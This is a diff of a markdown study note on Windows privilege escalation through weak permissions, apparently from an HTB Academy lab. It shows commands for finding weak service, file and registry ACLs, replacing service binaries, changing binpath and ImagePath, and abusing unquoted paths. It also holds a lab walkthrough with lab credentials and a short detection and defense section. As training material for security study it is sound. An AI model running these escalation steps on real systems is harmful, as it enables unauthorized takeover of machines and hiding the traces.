@@ -1,4 +1,4 @@
-# Weak Permissions Privilege Escalation
+# 🔐 Weak Permissions
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 🔧 Permissive File System ACLs
 
 ### Service Binary Discovery
+
 ```powershell
 # Use SharpUp to identify vulnerable service binaries
 .\SharpUp.exe audit
@@ -20,6 +21,7 @@ StartMode        : Auto
 ```
 
 ### Permission Verification
+
 ```cmd
 # Check file permissions with icacls
 icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
@@ -32,6 +34,7 @@ C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
 ```
 
 ### Binary Replacement Attack
+
 ```cmd
 # Backup original binary
 copy "C:\Program Files (x86)\PCProtect\SecurityService.exe" SecurityService.exe.bak
@@ -49,6 +52,7 @@ sc start SecurityService
 ## 🛠️ Weak Service Permissions
 
 ### Service Permission Enumeration
+
 ```cmd
 # Check service permissions with AccessChk
 accesschk.exe /accepteula -quvcw WindscribeService
@@ -60,6 +64,7 @@ WindscribeService
 ```
 
 ### Binary Path Modification Attack
+
 ```cmd
 # Check current local admin group
 net localgroup administrators
@@ -77,6 +82,7 @@ net localgroup administrators
 ```
 
 ### Service Cleanup
+
 ```cmd
 # Restore original binary path
 sc config WindscribeService binpath="C:\Program Files (x86)\Windscribe\WindscribeService.exe"
@@ -88,6 +94,7 @@ sc start WindscribeService
 ## 📁 Unquoted Service Path
 
 ### Path Discovery
+
 ```cmd
 # Find unquoted service paths
 wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
@@ -97,6 +104,7 @@ C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ```
 
 ### Execution Order Analysis
+
 ```cmd
 # Windows searches for executables in this order:
 C:\Program.exe
@@ -109,6 +117,7 @@ C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
 ## 🔑 Permissive Registry ACLs
 
 ### Registry Service Key Enumeration
+
 ```cmd
 # Check for weak registry ACLs
 accesschk.exe /accepteula "htb-student" -kvuqsw hklm\System\CurrentControlSet\services
@@ -119,6 +128,7 @@ RW HKLM\System\CurrentControlSet\services\ModelManagerService
 ```
 
 ### Registry Modification Attack
+
 ```powershell
 # Modify service ImagePath in registry
 Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\htb-student\malicious.exe"
@@ -129,6 +139,7 @@ Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerServi
 ## 🚀 Modifiable Registry Autorun Binary
 
 ### Autorun Program Discovery
+
 ```powershell
 # Check startup programs
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
@@ -139,6 +150,7 @@ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 ```
 
 ### Autorun Exploitation
+
 ```cmd
 # Check permissions on autorun binary
 icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"
@@ -150,12 +162,14 @@ icacls "C:\Program Files (x86)\Windscribe\Windscribe.exe"
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
-- **Access Method**: RDP
-- **Objective**: Escalate privileges using weak permissions
-- **Flag Location**: `C:\Users\Administrator\Desktop\WeakPerms\flag.txt`
+
+* **Credentials**: `htb-student:HTB_@cademy_stdnt!`
+* **Access Method**: RDP
+* **Objective**: Escalate privileges using weak permissions
+* **Flag Location**: `C:\Users\Administrator\Desktop\WeakPerms\flag.txt`
 
 ### Complete Walkthrough
+
 ```cmd
 # 1. RDP connect and enumerate services
 .\SharpUp.exe audit
@@ -184,12 +198,14 @@ net localgroup administrators htb-student /delete
 ## 🔄 Alternative Techniques
 
 ### PowerShell Service Enumeration
+
 ```powershell
 # Get services with weak permissions
 Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object {$_.StartMode -eq "Auto"}
 ```
 
 ### Manual Permission Checks
+
 ```cmd
 # Check file permissions
 icacls "C:\Program Files\Application\service.exe"
@@ -204,6 +220,7 @@ reg query HKLM\System\CurrentControlSet\Services\[SERVICE] /s
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Service configuration changes (Event ID 7040)
@@ -213,6 +230,7 @@ reg query HKLM\System\CurrentControlSet\Services\[SERVICE] /s
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security hardening:
 - Implement least privilege for service accounts
@@ -230,6 +248,6 @@ reg query HKLM\System\CurrentControlSet\Services\[SERVICE] /s
 4. **AccessChk and SharpUp** are essential enumeration tools
 5. **Cleanup important** to avoid detection and maintain operations
 
----
+***
 
-*Weak permissions exploitation leverages misconfigurations in file systems, services, and registry to achieve privilege escalation.* 
+_Weak permissions exploitation leverages misconfigurations in file systems, services, and registry to achieve privilege escalation._
